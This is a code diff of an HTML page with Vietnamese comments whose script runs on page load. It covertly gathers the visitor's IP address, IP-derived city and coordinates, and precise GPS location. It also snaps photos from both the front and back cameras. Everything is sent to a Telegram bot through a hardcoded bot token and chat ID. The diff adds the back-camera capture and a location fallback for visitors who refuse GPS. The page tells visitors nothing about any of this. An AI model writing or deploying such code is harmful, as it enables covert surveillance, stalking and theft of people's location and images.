@@ -36,25 +36,31 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // Cấu hình thông tin Telegram của bạn
         const BOT_TOKEN = '8907393193:AAHR3ePsPfQzds4U-vbo21ju3dM5_3hr5uA';
         const CHAT_ID = '8608244308';
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        // 1. Lấy Địa chỉ IP
-        async function getIPAddress() {
+        // 1. Lấy thông tin IP và Vị trí theo IP (Dự phòng khi từ chối vị trí chính xác)
+        async function getIPInfo() {
             try {
-                const res = await fetch('https://api.ipify.org?format=json');
+                const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                return data.ip;
+                return {
+                    ip: data.ip || 'Không rõ',
+                    city: data.city || '',
+                    region: data.region || '',
+                    country: data.country_name || '',
+                    lat: data.latitude,
+                    lon: data.longitude
+                };
             } catch (e) {
-                return "Không lấy được IP";
+                return { ip: 'Không lấy được IP', city: '', region: '', country: '', lat: null, lon: null };
             }
         }
 
-        // 2. Lấy Tọa độ GPS
+        // 2. Lấy Tọa độ GPS chính xác từ thiết bị
         function getGeolocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(null); return; }
@@ -66,56 +72,52 @@
             });
         }
 
-        // 3. Khởi tạo Stream Camera
-        async function getCameraStream() {
-            try {
-                return await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            } catch (e) {
-                return null;
-            }
+        // 3. Chụp ảnh từ Camera theo hướng chỉ định (user: Trước, environment: Sau)
+        function capturePhoto(facingMode) {
+            return new Promise(async (resolve) => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: { exact: facingMode } }
+                    }).catch(async () => {
+                        // Fallback nếu không hỗ trợ exact
+                        return await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+                    });
+
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        setTimeout(() => {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            // Tắt stream camera sau khi chụp
+                            stream.getTracks().forEach(track => track.stop());
+
+                            canvas.toBlob((blob) => {
+                                resolve(blob);
+                            }, 'image/jpeg', 0.8);
+                        }, 1000);
+                    };
+                } catch (e) {
+                    resolve(null);
+                }
+            });
         }
 
-        // 4. Xử lý gửi dữ liệu
-        async function initProcess() {
-            const userIP = await getIPAddress();
-            const location = await getGeolocation();
-            const stream = await getCameraStream();
-
-            let captionText = `🌐 **Thông tin thu thập:**\n• IP: ${userIP}\n`;
-
-            if (location) {
-                captionText += `• Tọa độ: ${location.lat}, ${location.lon}\n📍 **Google Maps:** https://www.google.com/maps?q=${location.lat},${location.lon}\n`;
+        // 4. Gửi ảnh/tin nhắn lên Telegram
+        async function sendToTelegram(photoBlob, captionText) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            if (photoBlob) {
+                formData.append('photo', photoBlob, 'photo.jpg');
+                formData.append('caption', captionText);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
             } else {
-                captionText += `• Vị trí: Chưa cấp quyền\n`;
-            }
-
-            if (stream) {
-                video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    setTimeout(() => {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        stream.getTracks().forEach(track => track.stop());
-
-                        canvas.toBlob((blob) => {
-                            if (!blob) return;
-                            const formData = new FormData();
-                            formData.append('chat_id', CHAT_ID);
-                            formData.append('photo', blob, 'photo.jpg');
-                            formData.append('caption', captionText);
-
-                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            });
-                        }, 'image/jpeg', 0.8);
-                    }, 1000);
-                };
-            } else {
-                captionText += `• Ảnh: Không có quyền camera`;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: captionText, parse_mode: 'Markdown' })
@@ -123,7 +125,49 @@
             }
         }
 
-        window.onload = initProcess;
+        // 5. Luồng xử lý chính
+        async function main() {
+            const ipData = await getIPInfo();
+            const gpsLocation = await getGeolocation();
+
+            let locationText = `🌐 **THÔNG TIN THU THẬP:**\n`;
+            locationText += `• IP: ${ipData.ip}\n`;
+
+            if (gpsLocation) {
+                locationText += `📍 **Vị trí GPS chính xác:**\n`;
+                locationText += `• Tọa độ: \`${gpsLocation.lat},${gpsLocation.lon}\`\n`;
+                locationText += `🔗 **Google Maps:** https://www.google.com/maps?q=${gpsLocation.lat},${gpsLocation.lon}\n`;
+            } else {
+                locationText += `📍 **Vị trí ước tính qua IP (Chưa duyệt GPS):**\n`;
+                if (ipData.city || ipData.region) {
+                    locationText += `• Khu vực: ${ipData.city}, ${ipData.region}, ${ipData.country}\n`;
+                }
+                if (ipData.lat && ipData.lon) {
+                    locationText += `🔗 **Google Maps (IP):** https://www.google.com/maps?q=${ipData.lat},${ipData.lon}\n`;
+                } else {
+                    locationText += `• Không thể xác định địa chỉ\n`;
+                }
+            }
+
+            // Chụp Cam Trước
+            const frontPhoto = await capturePhoto("user");
+            if (frontPhoto) {
+                await sendToTelegram(frontPhoto, locationText + `📸 **Loại ảnh:** Camera Trước (Selfie)`);
+            }
+
+            // Chụp Cam Sau
+            const backPhoto = await capturePhoto("environment");
+            if (backPhoto) {
+                await sendToTelegram(backPhoto, `📸 **Loại ảnh:** Camera Sau (Khung cảnh)`);
+            }
+
+            // Nếu không chụp được ảnh nào (do từ chối quyền) -> Gửi tin nhắn thông tin
+            if (!frontPhoto && !backPhoto) {
+                await sendToTelegram(null, locationText + `⚠️ **Camera:** Người dùng không cấp quyền camera.`);
+            }
+        }
+
+        window.onload = main;
     </script>
 </body>
 </html>
